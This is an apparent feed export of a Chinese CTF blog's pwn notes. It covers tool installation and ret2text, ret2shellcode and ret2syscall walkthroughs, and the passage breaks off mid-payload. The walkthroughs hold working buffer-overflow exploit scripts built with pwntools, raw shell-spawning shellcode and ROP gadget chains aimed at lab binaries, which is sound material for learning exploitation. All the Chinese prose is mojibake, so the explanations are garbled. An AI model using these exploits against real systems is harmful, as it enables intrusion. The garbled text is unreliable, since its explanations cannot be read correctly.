    <content type="html"><![CDATA[<h1 id="pwnåŸºæœ¬æ¦‚å¿µ"><a href="#pwnåŸºæœ¬æ¦‚å¿µ" class="headerlink" title="pwnåŸºæœ¬æ¦‚å¿µ"></a>pwnåŸºæœ¬æ¦‚å¿µ</h1><table><thead><tr><th>åè¯</th><th>æ¦‚å¿µ</th></tr></thead><tbody><tr><td>POC</td><td>Proof of Concepï¼Œç”¨äºè¯æ˜æ¼æ´å­˜åœ¨æˆ–è€…éªŒè¯å¯è¡Œæ€§</td></tr><tr><td>Payload</td><td>æœ‰æ•ˆè½½è·</td></tr><tr><td>Shellcode</td><td>ç”¨äºå¾—åˆ°shellçš„ä¸€æ®µä»£ç </td></tr><tr><td>EXP</td><td>Exploitï¼Œåˆ©ç”¨æ¼æ´è¿›è¡Œæ”»å‡»çš„ç¨‹åº</td></tr><tr><td>Glibc</td><td>GNU C Library</td></tr><tr><td>ROP</td><td>Return-Oriented Programming</td></tr><tr><td>UAF</td><td>Use After Free</td></tr><tr><td>DEP</td><td>Data Execution Prevention</td></tr><tr><td>ASLR</td><td>Address Space Layout Randomization</td></tr><tr><td>GOT</td><td>Global Offset Table</td></tr></tbody></table><h1 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h1><h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><p>pwndbgï¼Œä½¿gdbæ›´å‹å¥½çš„æ’ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303211948901.png"></p><p><strong>å®‰è£…</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/pwndbg/</span>pwndbg<br><br>cd pwndbg <br><br>./setup.sh<br></code></pre></td></tr></table></figure><p>å¯èƒ½ä¼šé‡åˆ°ç½‘ç»œé—®é¢˜ï¼Œéœ€è¦æ­£ç¡®é…ç½®gitã€pipã€å‘½ä»¤è¡Œä»£ç†</p><pre><code class="hljs">linuxä¸‹å¥½åƒé…ç½®äº†gitä»£ç†ä¹Ÿæ²¡ç”¨ï¼Œä¼šå‡ºç°å¥‡æ€ªæŠ¥é”™ï¼Œæœ€ç»ˆä½¿ç”¨proxychains ./setupæå®š</code></pre><p>ä¹Ÿæˆ–è®¸å¯ä»¥è€ƒè™‘ä¸‹è½½ deb æ–‡ä»¶</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">apt</span> install ./pwndbg_<span class="hljs-number">2023</span>.<span class="hljs-number">07</span>.<span class="hljs-number">17</span>_amd<span class="hljs-number">64</span>.deb<br><span class="hljs-comment"># pwndbg</span><br></code></pre></td></tr></table></figure><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p>checksecï¼Œç”¨äºæ£€æŸ¥æ–‡ä»¶çš„ä¿æŠ¤æœºåˆ¶ä¸åŸºæœ¬ä¿¡æ¯</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-meta">~&gt;</span> <span class="hljs-string">pwn checksec /bin/sh</span><br><span class="hljs-meta">[*]</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br>    <span class="hljs-attr">Arch</span>:     <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO</span>:    <span class="hljs-string">Full RELRO</span><br>    <span class="hljs-attr">Stack</span>:    <span class="hljs-string">Canary found</span><br>    <span class="hljs-attr">NX</span>:       <span class="hljs-string">NX enabled</span><br>    <span class="hljs-attr">PIE</span>:      <span class="hljs-string">PIE enabled</span><br>    <span class="hljs-attr">FORTIFY</span>:  <span class="hljs-string">Enabled</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>å­—æ®µ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>Arch</td><td>x64æ¶æ„ï¼Œ64ä½ï¼Œå°ç«¯åº</td></tr><tr><td>RELRO</td><td>è®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–åœ¨ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹GOTï¼ˆGlobal Offset Tableï¼‰æ”»å‡»</td></tr><tr><td>Stack CANARY</td><td>gcc -fno-stack-protectorç¦ç”¨ï¼Œgcc -fstack-protector å¯ç”¨</td></tr><tr><td>NX</td><td>å †æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤ï¼Œä¸èƒ½åœ¨æ ˆä¸Šæ‰§è¡Œshellcodeï¼Œç¼–è¯‘é€‰é¡¹: å…³é—­ <code>-z execstack</code> å¼€å¯<code>-z noexecstack</code>ã€‚DEPï¼ˆæ•°æ®æ‰§è¡Œä¿æŠ¤ï¼‰çš„ä¸€ç§</td></tr><tr><td>PIEï¼ˆASLRï¼‰</td><td>åœ°å€éšæœºåŒ–ã€‚randomize_va_space 0 - è¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€ç©ºé—´éšæœºåŒ–ã€‚ 1 - è¡¨ç¤ºå°†mmapçš„åŸºå€ï¼Œstackå’Œvdsoé¡µé¢éšæœºåŒ–ã€‚ 2 - è¡¨ç¤ºåœ¨1çš„åŸºç¡€ä¸Šå¢åŠ å †ï¼ˆheapï¼‰çš„éšæœºåŒ–ã€‚</td></tr></tbody></table><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>pwntoolsï¼Œä¸€ä¸ªpythonåº“</p><h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p>ROPgadgetï¼Œç”¨äºropåˆ©ç”¨</p><h1 id="2020æš‘æœŸLilac-pwnå…¥é—¨åŸ¹è®­"><a href="#2020æš‘æœŸLilac-pwnå…¥é—¨åŸ¹è®­" class="headerlink" title="2020æš‘æœŸLilac-pwnå…¥é—¨åŸ¹è®­"></a>2020æš‘æœŸLilac-pwnå…¥é—¨åŸ¹è®­</h1><p>é¢˜ç›®å½¢å¼</p><ul><li>Linuxä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶</li><li>åŒ…å«æŸç§æ¼æ´</li><li>æœåŠ¡å™¨ä¸Šæœ‰ä¸€ä¸ªç›®æ ‡æ–‡ä»¶, å…¶å†…å®¹ä¸ºflag</li><li>åˆ©ç”¨æ¼æ´å¯ä»¥è¯»å–ç³»ç»Ÿä¸­ç›®æ ‡æ–‡ä»¶çš„å†…å®¹</li></ul><p>ä¸€äº›å·¥å…·çš„ä½¿ç”¨</p><ul><li><p>ida    </p><ul><li>cheatsheet <a href="https://www.hex-rays.com/products/ida/support/freefiles/IDA_Pro_Shortcuts.pdf">https://www.hex-rays.com/products/ida/support/freefiles/IDA_Pro_Shortcuts.pdf</a> </li></ul></li><li><p>gdb</p><ul><li>x/NFU address ï¼ˆâ€“N = number â€“F = format â€“U = unitï¼‰</li><li>cheatsheet <a href="https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf]">https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf]</a>(<a href="https://darkdust.net/files/GDB">https://darkdust.net/files/GDB</a></li></ul></li><li><p>pwntools</p><ul><li><a href="https://bbs.pediy.com/thread-247217.htm">https://bbs.pediy.com/thread-247217.htm</a> </li><li><a href="http://docs.pwntools.com/en/stable/">http://docs.pwntools.com/en/stable/</a></li></ul></li><li></li></ul><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ul><li><a href="https://www.anquanke.com/post/id/196095#h2-7">https://www.anquanke.com/post/id/196095#h2-7</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ROPå…¥é—¨</title>
    <link href="/p/6cc1c464/"/>
    <url>/p/6cc1c464/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/rop1.jpg"></p><p><img src="https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Me6KFbb12e2jzW1fcUM%2F-Me6N03HxfivnVlXvDsO%2Fimage.png?alt=media&token=415212b5-7a8f-405b-bdcf-a3875b2878f8"></p><h1 id="åŸºæœ¬å·¥å…·"><a href="#åŸºæœ¬å·¥å…·" class="headerlink" title="åŸºæœ¬å·¥å…·"></a>åŸºæœ¬å·¥å…·</h1><p>pwndbg</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg<br><span class="hljs-built_in">cd</span> pwndbg<br>./setup.sh<br></code></pre></td></tr></table></figure><p>checksec</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/slimm609/checksec.sh<br><br>sudo ln -sf ~/checksec.sh/checksec /usr/local/bin/checksec<br></code></pre></td></tr></table></figure><p>pwntools</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install python3-pip<br><br>python3 -m pip install pwntools<br></code></pre></td></tr></table></figure><p>ROPgadget</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/JonathanSalwan/</span>ROPgadget.git<br><br>cd ROPgadget<br><br>sudo python setup.py install<br><br><span class="hljs-comment"># é‡åˆ°æŠ¥é”™</span><br>pkg_resources.ResolutionError: Script <span class="hljs-string">&#x27;scripts/ROPgadget&#x27;</span> not found <span class="hljs-keyword">in</span> metadata at <span class="hljs-string">&#x27;/home/philo/.local/lib/python3.8/site-packages/ROPGadget-7.3.dist-info&#x27;</span><br><br>$ sudo cp -r <span class="hljs-regexp">/home/</span>philo<span class="hljs-regexp">/.local/</span>lib<span class="hljs-regexp">/python3.8/</span>site-packages/ROPGadget-<span class="hljs-number">7.3</span>.dist-info<br></code></pre></td></tr></table></figure><p>LibcSearcher</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/lieanu/LibcSearcher.git<br><br>cd LibcSearcher<br><br>python setup.py develop # å¦‚æœæƒé™ä¸å¤ŸåŠ ä¸ªsudo<br></code></pre></td></tr></table></figure><h1 id="tldr"><a href="#tldr" class="headerlink" title="tldr"></a>tldr</h1><ul><li>å¦‚æœæœ‰<code>system(/bin/sh) </code>ä»£ç å¯ä»¥ç›´æ¥è¦†ç›–è¿”å›åœ°å€è·³è½¬ï¼Œä»è€Œå¾—åˆ°shell</li><li>ä½¿ç”¨<code>asm(shellcraft.sh())</code>è‡ªè¡Œæ„é€ shellcodeï¼Œå°†è¿”å›åœ°å€ä¿®æ”¹ä¸ºå¯ä»¥æ‰§è¡Œçš„bssæ®µçš„ä»£ç </li><li>ä½¿ç”¨ROPgadgetå‘½ä»¤å»æ‰¾åˆ°gadgetè¿›è¡Œç»„åˆï¼Œåˆ©ç”¨pop+retçš„æœºåˆ¶å¯¹å¯„å­˜å™¨è¿›è¡Œèµ‹å€¼ï¼Œä»è€Œè§¦å‘<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></li></ul><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>ret2textæŒ‡æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (.text)</p><p>checksecä¸€ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">~&gt;</span><span class="bash"> checksec  --file=ret2text</span><br>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE<br>Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   83 Symbols     No       0               2       ret2text<br></code></pre></td></tr></table></figure><p>f5ï¼Œå‘ç°ç”±äºmainå‡½æ•°ä¸­è°ƒç”¨äº†getså‡½æ•°ï¼Œå› æ­¤å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There is something amazing here, do you know anything?&quot;</span>);<br>  gets(s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Maybe I will tell you next time !&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨alt+tæŸ¥æ‰¾å­—ç¬¦ä¸²ï¼Œå‘ç°æœ‰<code>system(/bin/sh)</code>ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ret2textçš„æ–¹å¼è·å¾—shellï¼Œå°†è¿”å›åœ°å€ç›´æ¥ä¿®æ”¹ä¸º0804863Aå³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">.rodata:<span class="hljs-number">08048763</span> command         db <span class="hljs-string">&#x27;/bin/sh&#x27;</span>,<span class="hljs-number">0</span>          ; DATA XREF: secure+<span class="hljs-number">3</span>Dâ†‘o<br>    <br>.text:<span class="hljs-number">0804863</span>A                 mov     dword ptr [esp], offset command ; <span class="hljs-string">&quot;/bin/sh&quot;</span><br>.text:<span class="hljs-number">08048641</span>                 call    _system<br></code></pre></td></tr></table></figure><blockquote><p>ä¸å°å¿ƒå…³é—­äº†çª—å£ï¼Œæƒ³æ¢å¤å¯ä»¥ç‚¹å‡»Window-ã€‹reset desktop</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/image-20230320215831749.png"></p><p>getså‡½æ•°è¢«è°ƒç”¨æ—¶å†™å…¥å­—ç¬¦ä¸²aaaaaï¼Œè§‚å¯Ÿå¯ä»¥å‘ç°ç¼“å†²åŒºçš„èµ·å§‹åœ°å€ï¼Œä¸º<code>$esp+0x1c</code>ï¼Œä¹Ÿå³æ˜¯0xffffd2ec</p><blockquote><p>ä¸‹æ–­ç‚¹çš„å‡ ç§æ–¹å¼ï¼š</p><ul><li>b *main+4</li><li>b *0xffff1234</li><li>b func_name</li></ul></blockquote><p><code>$ebp-$esp-0x1c+4</code>å°±æ˜¯ç¼“å†²åŒºèµ·å§‹åœ°å€ç›¸å¯¹äºè¿”å›åœ°å€çš„åç§»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">##!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)<br>target = <span class="hljs-number">0x804863a</span><br>sh.sendline(<span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x6c</span>+<span class="hljs-number">4</span>) + p32(target))<br>sh.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):<br>File <span class="hljs-string">&quot;payload.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">6</span>, in <span class="hljs-symbol">&lt;module&gt;</span><br><span class="hljs-keyword">sh</span>.sendline(<span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">0</span>x6c+<span class="hljs-number">4</span>) + p32(target))<br>TypeError: can <span class="hljs-keyword">only</span> concatenate str (not <span class="hljs-string">&quot;bytes&quot;</span>) <span class="hljs-keyword">to</span> str<br><br>éœ€è¦ä½¿ç”¨<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;A&#x27;</span>è€Œä¸æ˜¯<span class="hljs-string">&#x27;A&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303202347078.png"></p><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">~&gt;</span><span class="bash"> file ret2shellcode</span><br>ret2shellcode: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=47e6d638fe0f3a3ff4695edb8b6c7e83461df949, with debug_info, not stripped<br><span class="hljs-meta"></span><br><span class="hljs-meta">~&gt;</span><span class="bash"> checksec  --file=ret2shellcode</span><br>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE<br>Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   79 Symbols     No       0               3       ret2shellcode<br></code></pre></td></tr></table></figure><p>ä¸ä¸Šä¸€é¢˜ä¸åŒï¼Œæ­¤æ¬¡æ²¡æœ‰<code>system(/bin/sh)</code>å¯ä»¥ç›´æ¥è·³è½¬ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±æ„é€ shellcode</p><ul><li>æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¼šè¢«å¤åˆ¶åˆ°buf2ï¼ˆåœ¨bssæ®µï¼‰ï¼Œå¯ä»¥ä½¿ç”¨vmmapå‘½ä»¤æŸ¥çœ‹è¿™æ®µåœ°å€æ˜¯ä¸æ˜¯å¯æ‰§è¡Œçš„ï¼Œå¦‚æœå¯ä»¥æ‰§è¡Œï¼Œé‚£ä¹ˆå°±å°†è¿”å›åœ°å€è¦†ç›–ä¸ºbuf2çš„åœ°å€</li><li>ä½¿ç”¨gdbæŸ¥çœ‹getså‡½æ•°è¢«è°ƒç”¨æ—¶çš„æ ˆå¸§æƒ…å†µï¼Œå‘ç°ç¼“å†²åŒºåœ¨<code>esp+0x1c</code>çš„åœ°æ–¹</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">lea     eax, [esp+0x1c]<br>mov     [esp], eax      ; s<br>call    _gets<br></code></pre></td></tr></table></figure><p>æ³¨æ„line9</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No system for you this time !!!&quot;</span>);<br>  gets(s);<br>  <span class="hljs-built_in">strncpy</span>(buf2, s, <span class="hljs-number">0x64</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bye bye ~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br></code></pre></td></tr></table></figure><p>æ„é€ exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br>shellcode = asm(shellcraft.sh()) <span class="hljs-comment">#ç”Ÿæˆshellcode</span><br>buf2_addr = <span class="hljs-number">0x804a080</span> <span class="hljs-comment">#å°†è¿”å›åœ°å€è¦†ç›–ä¸ºbuf2çš„åœ°å€</span><br><br>sh.sendline(shellcode.ljust(<span class="hljs-number">112</span>, <span class="hljs-string">&#x27;A&#x27;</span>) + p32(buf2_addr)) <span class="hljs-comment">#å°†shellcodeä¸è¶³112çš„éƒ¨åˆ†ç”¨Aå¡«å……ï¼Œå¹¶ä¸”å·¦å¯¹é½</span><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹å¡«å……çš„å­—ç¬¦ä¸²</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">b</span>&#x27;jhh///sh/bin\x<span class="hljs-number">89</span>\xe<span class="hljs-number">3</span>h\x<span class="hljs-number">01</span>\x<span class="hljs-number">01</span>\x<span class="hljs-number">01</span>\x<span class="hljs-number">01</span>\x<span class="hljs-number">814</span>$ri\x<span class="hljs-number">01</span>\x<span class="hljs-number">011</span>\xc<span class="hljs-number">9</span>Qj\x<span class="hljs-number">04</span>Y\x<span class="hljs-number">01</span>\xe<span class="hljs-number">1</span>Q\x<span class="hljs-number">89</span>\xe<span class="hljs-number">11</span>\xd<span class="hljs-number">2</span>j\x<span class="hljs-number">0</span>bX\xcd\x<span class="hljs-number">80</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x<span class="hljs-number">80</span>\xa<span class="hljs-number">0</span>\x<span class="hljs-number">04</span>\x<span class="hljs-number">08</span>&#x27;<br></code></pre></td></tr></table></figure><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>éœ€è¦è§¦å‘execveç³»ç»Ÿè°ƒç”¨æ¥è·å– shellï¼Œä¹Ÿå³æ˜¯æ‰§è¡Œä»£ç ï¼š<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[], <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> envp[])</span></span>;<br></code></pre></td></tr></table></figure><p>å¯¹äº32ä½ç¨‹åºï¼Œä¼ å‚ä»å·¦å¾€å³ä¾æ¬¡æ˜¯ï¼š EBXã€ECXã€EDXã€ESIã€EDIã€EBPï¼ŒEAXå¯„å­˜å™¨å­˜æ”¾ç³»ç»Ÿè°ƒç”¨å·</p><p>å¯¹äº64ä½ç¨‹åºï¼Œä¼ å‚ä»å·¦å¾€å³ä¾æ¬¡æ˜¯ï¼š RDIã€RSIã€RDXã€R10ã€R8ã€R9 ï¼Œï¼ŒRAXå¯„å­˜å™¨å­˜æ”¾ç³»ç»Ÿè°ƒç”¨å·</p><p>åœ¨è§„åˆ’å¥½å¯„å­˜å™¨ä¹‹åï¼Œéœ€è¦æ‰§è¡Œ<code>int 0x80</code>å‘½ä»¤å»è§¦å‘ç³»ç»Ÿè°ƒç”¨</p><p>å› æ­¤ï¼Œä¸ºäº†æ‰§è¡Œä¸Šé¢ä»£ç ï¼Œæˆ‘ä»¬éœ€è¦è®©å¯„å­˜å™¨æ»¡è¶³ï¼š</p><ul><li>eax ä¿å­˜ 0xb ï¼ˆexecveå‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·ï¼‰</li><li>ebx ä¿å­˜å­—ç¬¦ä¸²â€œ/bin/shâ€çš„åœ°å€ï¼ˆconst char *filenameï¼‰</li><li>ecx ä¸º0ï¼ˆchar *const argv[]ï¼‰</li><li>edxä¸º0ï¼ˆchar *const envp[]ï¼‰</li></ul><p>å› æ­¤æˆ‘ä»¬éœ€è¦æ„é€ rop gadgets</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303211937744.png"></p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303211948901.png"></p><ul><li>EBP  0xffffd328</li><li>ESP  0xffffd2a0</li><li>ç¼“å†²åŒºåœ¨espä¸Šé¢0x1cçš„ä½ç½®</li><li><code>$EBP-$ESP-0x1c+4</code>æ˜¯åç§»</li></ul><p>å¯»æ‰¾ä¸€äº›gadgesï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">~&gt; ROPgadget --binary rop  --only <span class="hljs-emphasis">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-emphasis">&#x27;ebx&#x27;</span><br><br>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret #pop_edx_ecx_ebx_ret<br><br>~&gt; ROPgadget --binary rop  --string <span class="hljs-emphasis">&#x27;/bin/sh&#x27;</span><br><span class="hljs-section">Strings information</span><br><span class="hljs-section">============================================================</span><br>0x080be408 : /bin/sh<br><br><span class="hljs-code"> ~&gt; ROPgadget --binary rop  --only &#x27;int&#x27;</span><br><span class="hljs-section">Gadgets information</span><br><span class="hljs-section">============================================================</span><br>0x08049421 : int 0x80<br><br>Unique gadgets found: 1<br><br>~&gt; ROPgadget --binary rop  --only <span class="hljs-emphasis">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-emphasis">&#x27;eax&#x27;</span><br><br>0x080bb196 : pop eax ; ret<br></code></pre></td></tr></table></figure><p>æ„é€ payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 